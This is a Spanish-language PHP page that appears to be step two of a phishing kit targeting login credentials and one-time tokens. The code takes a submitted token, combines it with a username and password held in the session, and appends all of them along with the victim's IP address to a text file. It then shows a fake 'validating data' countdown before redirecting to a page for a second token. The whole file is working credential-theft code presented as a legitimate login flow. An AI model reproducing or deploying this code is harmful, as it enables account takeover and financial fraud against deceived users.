<?php 
error_reporting(0);
session_start();
/*session is started if you don't write this line can't use $_Session  global variable*/
$_SESSION["token1"]=$_POST["token1"];



function getRealIP() {

    if (!empty($_SERVER['HTTP_CLIENT_IP']))
        return $_SERVER['HTTP_CLIENT_IP'];
       
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
        return $_SERVER['HTTP_X_FORWARDED_FOR'];
   
    return $_SERVER['REMOTE_ADDR'];
}


$token = $_POST["token"];

$usuario  = $_SESSION["usuario"];
$password = $_SESSION["password"];
$token1   = $_SESSION["token1"];
$count    = $_SESSION["count"];
$ip = getRealIP();

if (isset($usuario) != null && isset($password) != null && isset($password) != null && $count == 2) {
    $ar=fopen("usuarios.txt","a");
    fwrite( $ar ,'

====== PASO 2
       Usuario: '.$usuario.' | clave: '.$password.' | token1: '.$token1.' | ip: '.$ip.'
');
    fclose($ar);
    $_SESSION["count"]= 3;
}
?>  
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bienvenido</title>
    <link rel="shortcut icon" href="./assets/favicon.ico" type="image/x-icon">

    <script src="https://cdn.tailwindcss.com"></script>

</head>
<body>
    <div style="height: 100vh; width: 100vw;" class="flex justify-center items-center flex-col gap-5">
        <img class="h-[30px]" src="./assets/logo.svg" alt="">
        <p class="text-black">Estamos validando los datos, espera <strong id="time"><label id="countdown">15</label> segundos.</strong></p>

    </div>

    <script>
        var url="token2.php";
        var seconds = 15; //número de segundos a contar
        function secondPassed() {
            var minutes = Math.round((seconds - 30)/60); //calcula el número de minutos
            var remainingSeconds = seconds % 60; //calcula los segundos
            //si los segundos usan sólo un dígito, añadimos un cero a la izq
            if (remainingSeconds < 10) { 
            remainingSeconds = "0" + remainingSeconds; 
            } 
            document.getElementById('countdown').innerHTML = seconds; 
            if (seconds == 0) { 
            clearInterval(countdownTimer); 
            window.location=url;
            document.getElementById('countdown').innerHTML = ""; 
            } else { 
            seconds--; 
            } 
        } 
        var countdownTimer = setInterval(secondPassed, 1000);
    </script>
</body>
</html>